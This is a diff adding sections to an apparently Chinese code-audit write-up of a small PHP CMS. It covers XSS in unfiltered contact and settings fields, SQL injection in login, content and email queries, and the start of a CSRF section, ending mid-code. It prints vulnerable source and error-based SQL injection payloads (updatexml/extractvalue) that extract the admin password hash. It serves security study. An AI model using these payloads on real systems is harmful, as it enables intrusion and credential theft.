@@ -462,21 +462,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-05
+                    2021-06-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    2.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    11 分
                 </div>
                 
 
@@ -608,6 +608,222 @@ Xdebug测试：PHPStorm_2021.1.3 + Xdebug_2.5.5 + Chrome_91.0.4472.77 + Xdebug h
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里是个非常简单的判断，user为空则返回登录界面，当user不为空就直接访问后台页面。所以这里可以直接用cookie中的user判断直接进入后台，而不需要进行账号密码的验证。</p>
 <p><img src="9.jpg"></p>
+<h2 id="iii-XSS漏洞"><a href="#iii-XSS漏洞" class="headerlink" title="iii. XSS漏洞"></a>iii. XSS漏洞</h2><h4 id="联系界面"><a href="#联系界面" class="headerlink" title="联系界面"></a>联系界面</h4><p>首先我们抓包查看联系界面的执行步骤。<br><img src="10.jpg"></p>
+<p>它这里同样是上传了一个r=submit的参数同时附加了一个type参数。先看到submit.php。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'inc/conn.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$mail</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$cid</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$tz</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tz'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tz</span><span class="token operator">==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$tz</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+<span class="token variable">$jz</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jz'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'randcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'randcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('抱歉，验证码错误，请重新输入！');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('抱歉，昵称不能为空！');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$mail</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('抱歉，昵称不能为空！');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+	
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('抱歉，您还没有告诉我您想说的话呢！');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+	
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([\x81-\xfe][\x40-\xfe])/"</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('亲，再说点别的了吧？');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>	
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$url</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"http://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token variable">$url</span><span class="token operator">=</span>	<span class="token variable">$url</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$url</span><span class="token operator">=</span>	<span class="token string double-quoted-string">"http://"</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">;</span>	
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$content</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤HTML</span>
+
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$fhlink</span><span class="token operator">=</span><span class="token string double-quoted-string">"/?r=content&amp;cid="</span><span class="token operator">.</span><span class="token variable">$cid</span><span class="token punctuation">;</span>
+<span class="token variable">$fhname</span><span class="token operator">=</span><span class="token string double-quoted-string">"评论"</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$fhlink</span><span class="token operator">=</span><span class="token string double-quoted-string">"/?r=contact"</span><span class="token punctuation">;</span>
+<span class="token variable">$fhname</span><span class="token operator">=</span><span class="token string double-quoted-string">"留言"</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string single-quoted-string">'download'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$fhlink</span><span class="token operator">=</span><span class="token string double-quoted-string">"/?r=software&amp;cid="</span><span class="token operator">.</span><span class="token variable">$cid</span><span class="token punctuation">;</span>
+<span class="token variable">$fhname</span><span class="token operator">=</span><span class="token string double-quoted-string">"软件评论"</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里我们可以看到名字、邮箱和url都没有进行过滤，但是我们输入的内容进行了过滤。这里我们可以尝试写三个xss语句进行注入，然后登录界面或者后台查看哪个能进行反弹。<br><img src="11.jpg"></p>
+<p>重新刷新后进行反弹。<br><img src="12.jpg"></p>
+<p>进入后台同样也反弹了1。进入留言列表我们也看到了返回了1。同样我们打开内容浏览，发现注入进去了，但是没有进行显示所以我们邮箱和url注入只注入到了数据库中，如果管理员调用邮箱或者url的时候就会进行反弹。<br><img src="13.jpg"><br><img src="14.jpg"><br><img src="15.jpg"></p>
+<h4 id="后台基础设置"><a href="#后台基础设置" class="headerlink" title="后台基础设置"></a>后台基础设置</h4><p>首先看到seitset.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'../inc/checklogin.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'../inc/conn.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$setopen</span><span class="token operator">=</span><span class="token string single-quoted-string">'class="open"'</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM settings"</span><span class="token punctuation">;</span>
+<span class="token variable">$resul</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$site</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$resul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$save</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$title</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$stitle</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'stitle'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$keywords</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'keywords'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$description</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$tel</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tel'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$mail</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$qq</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'qq'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$icp</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'icp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$bottominfo</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bottominfo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$tongji</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tongji'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$save</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$title</span><span class="token operator">==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('抱歉，标题不能为空。');history.back()&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$url</span><span class="token operator">==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('抱歉，网址不能为空。');history.back()&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE settings SET 
+name='<span class="token interpolation"><span class="token variable">$name</span></span>',
+title='<span class="token interpolation"><span class="token variable">$title</span></span>',
+stitle='<span class="token interpolation"><span class="token variable">$stitle</span></span>',
+keywords='<span class="token interpolation"><span class="token variable">$keywords</span></span>',
+description='<span class="token interpolation"><span class="token variable">$description</span></span>',
+url='<span class="token interpolation"><span class="token variable">$url</span></span>',
+tel='<span class="token interpolation"><span class="token variable">$tel</span></span>',
+mail='<span class="token interpolation"><span class="token variable">$mail</span></span>',
+qq='<span class="token interpolation"><span class="token variable">$qq</span></span>',
+icp='<span class="token interpolation"><span class="token variable">$icp</span></span>',
+tongji='<span class="token interpolation"><span class="token variable">$tongji</span></span>',
+bottominfo='<span class="token interpolation"><span class="token variable">$bottominfo</span></span>',
+date=now()"</span><span class="token punctuation">;</span>
+@<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'修改错误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('亲爱的，基本设置成功更新。');location.href='?r=siteset'&lt;/script>"</span><span class="token punctuation">;</span> 
+<span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里没有进行任何过滤，我们直接全部注入。</p>
+<p><img src="20.jpg"></p>
+<p>最后成功返回了3，7，11，10的弹窗。</p>
+<h2 id="iiii-SQL注入"><a href="#iiii-SQL注入" class="headerlink" title="iiii.SQL注入"></a>iiii.SQL注入</h2><h3 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h3><p>我们还是看到登录界面验证窗口，之前在审计Cookie越权访问的时候发现在验证user值的地方存在一个sql注入漏洞。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$login</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM manage WHERE user='<span class="token interpolation"><span class="token variable">$user</span></span>'"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$users</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>"</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>mysql_query()函数执行一条 MySQL 查询。</li>
+<li>mysql_fetch_array()函数从结果集中取得一行作为关联数组，或数字数组。</li>
+<li>这里对user值没有进行检测和过滤，因为存在mysql_error()函数可以进行报错注入。</li>
+</ul>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">1&#39; or updatexml(1,concat((select concat(0x7e,password) from manage)),0)#
+
+SQL语句有误：XPATH syntax error: &#39;~5f4dcc3b5aa765d61d8327deb882cf9&#39;
+到这里发现md5解密少一位，这是因为报错长度有限制，接下来可以再用一次payload
+
+1&#39; or updatexml(1,concat((select concat(password,0x7e) from manage)),0)#
+
+SQL语句有误：XPATH syntax error: &#39;f4dcc3b5aa765d61d8327deb882cf99~&#39;
+到这里发现少的一位是9，其实这里也可以爆破
+
+其实还有一些payload，也是同样的效果
+
+1&#39; or extractvalue(1,concat((select concat(0x7e,password) from manage)))#
+1&#39; or extractvalue(1,concat((select concat(password,0x7e) from manage)))#
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="16.jpg"></p>
+<h4 id="内容页面插入点-id没有进行引号包含"><a href="#内容页面插入点-id没有进行引号包含" class="headerlink" title="内容页面插入点$id没有进行引号包含"></a>内容页面插入点$id没有进行引号包含</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'inc/conn.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'inc/time.class.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM settings"</span><span class="token punctuation">;</span>
+<span class="token variable">$resul</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$resul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM content WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>'"</span><span class="token punctuation">;</span>
+<span class="token variable">$resul</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$resul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$navid</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'navclass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM navclass WHERE id='<span class="token interpolation"><span class="token variable">$navid</span></span>'"</span><span class="token punctuation">;</span>
+<span class="token variable">$resul</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$navs</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$resul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//浏览计数</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE content SET hit = hit+1 WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>
+@<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'修改错误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>$query = &quot;UPDATE content SET hit = hit+1 WHERE id=$id&quot;;</code>$id虽然在传入时就已经被过滤了单引号，但是在这句里面没有进行引号包含。执行结果如下。</p>
+<p><img src="17.jpg"></p>
+<h4 id="email邮箱没有进行过滤"><a href="#email邮箱没有进行过滤" class="headerlink" title="email邮箱没有进行过滤"></a>email邮箱没有进行过滤</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$mail</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mail'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM interaction WHERE( mail = '<span class="token interpolation"><span class="token variable">$mail</span></span>')"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SQL语句有误：'</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到这里的sql注入和我们之前的不一样，这里没有需要在原有的 ‘ 基础上 ) 然后进行注入。</p>
+<p><img src="18.jpg"><br><img src="19.jpg"></p>
+<p><strong>其实这里还有很多sql注入，但是类型都是相同的，所以我选择了几个典型的进行总结</strong></p>
+<h2 id="iiiii-CSRF"><a href="#iiiii-CSRF" class="headerlink" title="iiiii. CSRF"></a>iiiii. CSRF</h2><p>可以看到wzlist.php这个文件。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'../inc/checklogin.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">require</span> <span class="token string single-quoted-string">'../inc/conn.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$wzlistopen</span><span class="token operator">=</span><span class="token string single-quoted-string">'class="open"'</span><span class="token punctuation">;</span>
+<span class="token variable">$pageyema</span><span class="token operator">=</span><span class="token string double-quoted-string">"?r=wzlist&amp;page="</span><span class="token punctuation">;</span>
+
+<span class="token variable">$delete</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$delete</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE FROM content WHERE id='<span class="token interpolation"><span class="token variable">$delete</span></span>'"</span><span class="token punctuation">;</span>
